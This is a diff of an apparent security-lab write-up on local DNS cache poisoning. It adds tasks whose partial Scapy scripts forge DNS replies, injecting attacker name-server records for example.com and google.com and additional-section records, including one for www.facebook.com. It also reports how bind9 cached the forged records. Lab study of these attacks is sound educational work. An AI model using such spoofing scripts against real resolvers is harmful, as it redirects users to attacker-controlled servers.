@@ -93,7 +93,7 @@ now when we ask the attacker name server, which we normally would not; we get th
 In this task we are going to sniff the local network for any dns queries that are about `example.com`; Now when victim digs the `www.example.com`; it sends a DNS query to the local dns server. Now if we are quicker than the local dns, we can forge a respond and send this to the victim before the local DNS does; this way we can forward victim to any server we like whenever he/she wants to visit `example.com`; to this end we write the following Scapy script:
 
 ```python
-NS_NAME = "example.com"
+NS_NAME = "www.example.com"
 def spoof_dns(pkt):
     if (DNS in pkt and NS_NAME in pkt[DNS].qd.qname.decode('utf-8')):
         print(pkt.sprintf("{DNS: %IP.src% --> %IP.dst%: %DNS.id%}"))
@@ -143,7 +143,7 @@ Now we want to have control over all the `example.com` domain not only the `www.
 ATTCKER_NS = 'ns.attacker32.com'
 def spoof_dns(pkt):
         # ...
-           # The Authority Section
+        # The Authority Section
         NSsec1 = DNSRR(rrname='example.com', type='NS',ttl=259200, rdata=ATTCKER_NS)
         # Create a DNS object
         dns = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0,qr=1,qdcount=1, ancount=1,nscount=1, arcount=0, an=Anssec, ns= NSsec1)
@@ -156,3 +156,47 @@ Note that when creating the `dns` layer we have changed `nscount` to `1` and set
 The procedure is exactly like before; note that now in the dns cache we have an NS record!
 
 ## Task 4
+
+In this task we take the DNS cache poisoning into next level. Now we want to take control over arbitrarily domains that have nothing to do with the actual victim DNS queries. For example we want set an NS record for `google.com` in the local DNS cache while victim is asking about the `www.example.com` IP in it's query. To do this we slightly change the last script:
+ ```python
+#  ...
+def spoof_dns(pkt):
+    #  ...
+        NSsec1 = DNSRR(rrname='example.com', type='NS',ttl=259200, rdata=ATTCKER_NS)
+        NSsec2 = DNSRR(rrname='google.com', type='NS',ttl=259200, rdata=ATTCKER_NS)
+        # Create a DNS object
+        dns = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0,qr=1,qdcount=1, ancount=1,nscount=2, arcount=0, an=Anssec1, ns= NSsec2/NSsec1)
+        #  ...
+#  ...
+```
+We just have added another ns record this time for `google.com` domain in the DNS response; this is the script in action, procedure is as before:
+![a](/screenshots/task4.png)
+
+# Task 5
+Here we are going to modify the additional section of the response and see what sticks,i.e. what records we put in the additional section are going to be added to cache; To this end we modify the previous script as follows:
+
+ ```python
+#  ...
+def spoof_dns(pkt):
+    #  ...
+        # The Authority Section
+               # The Authority Section
+        NSsec1 = DNSRR(rrname='example.com', type='NS',ttl=259200, rdata=ATTCKER_NS)
+        NSsec2 = DNSRR(rrname='example.com', type='NS',ttl=259200, rdata='ns.example.net')
+
+        # The Additional Section
+        Addsec1 = DNSRR(rrname='ns.attacker32.com', type='A',ttl=259200, rdata='1.2.3.4')
+        Addsec2 = DNSRR(rrname='ns.example.net', type='A',ttl=259200, rdata='5.6.7.8')
+        Addsec3 = DNSRR(rrname='www.facebook.com', type='A',ttl=259200, rdata='3.4.5.6')
+
+        # Create a DNS object
+        dns = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0,qr=1,qdcount=1, ancount=1,nscount=2, 
+        arcount=3, an=Anssec1, ns= NSsec2/NSsec1, ar=Addsec1/Addsec2/Addsec3)
+        #  ...
+#  ...
+```
+And here is the result:
+![a](/screenshots/task5.png)
+Interestingly only two NS records for the `example.com` domain are in the cache and none of the records in the additional section are there; this might be because we have already put the IP address of `www.example.com` in the answer section; lets see what would happen if we remove this section:
+![a](/screenshots/task5-no-answer.png)
+Now we only have one related record in cache and it's for `example.com` domain with a valid name server! we suspect that bind9 first tries to contact the `ns.attacker32.com` using the invalid IP of `1.2.3.4` and then since it does not receive any replies; after a while the true response from root servers for `www.example.com` arrive and set the correct values in cache. So none of the additional records are used successfully and none are cached.
